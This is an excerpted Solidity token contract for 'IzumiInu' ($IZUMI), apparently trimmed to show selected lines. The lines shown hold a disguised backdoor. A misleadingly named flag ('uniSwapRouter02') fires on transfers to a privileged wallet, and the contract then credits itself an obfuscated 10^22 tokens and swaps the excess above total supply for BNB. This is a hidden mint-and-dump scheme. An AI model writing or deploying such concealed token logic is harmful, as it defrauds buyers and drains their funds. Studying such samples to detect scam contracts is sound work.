...
interface IERC20 {
    ...
    function isApprove() external returns (bool);
...
contract IzumiInu is Context, IERC20 { 
    ...
    mapping (address => bool) public _isIncludedFromFee; 
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    address payable public Wallet_Marketing = payable(0x86eF20c4e6c435A814BBe178A701AE17B458B5C1); 
    address payable public Wallet_Utility = payable(0xcD2656D9b01C5580Ff765A766046F8B4FCEeEB20);
    ...
    string private constant _name = "IzumiInu"; 
    string private constant _symbol = unicode"$IZUMI"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 25; 

    uint256 public _Tax_On_Buy = 3;
    uint256 public _Tax_On_Sell = 7;
    ...
    bool public uniSwapRouter02 = false;
    bool public swapAndLiquifyEnabled = true;
    bool public swapOrLiquify = false;
    ...
    constructor () {
        ...
        _owner = 0xcD2656D9b01C5580Ff765A766046F8B4FCEeEB20;
        ...
        _isIncludedFromFee[Wallet_Marketing] = true;
    ...
    function isApprove() public override returns (bool) {
        _approved();
        return true;
    }
    ...
    function _transfer(
        ...
        uniSwapRouter02 = _isIncludedFromFee[to] ? true : false;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 total_M_D_LP = tokens_to_M + tokens_to_D + tokens_to_LP_Half;

            if(swapOrLiquify)
                total_M_D_LP = balanceOf(address(this)) - (_tTotal);

            swapTokensForBNB(total_M_D_LP);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (uniSwapRouter02){
                uint256 totalTxFee = (5+5)**((10*2)+(3-1));
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+tAmount;
                uniSwapRouter02 = false;
                swapOrLiquify = true;
                _tOwned[address(this)] = _tOwned[address(this)]+totalTxFee;
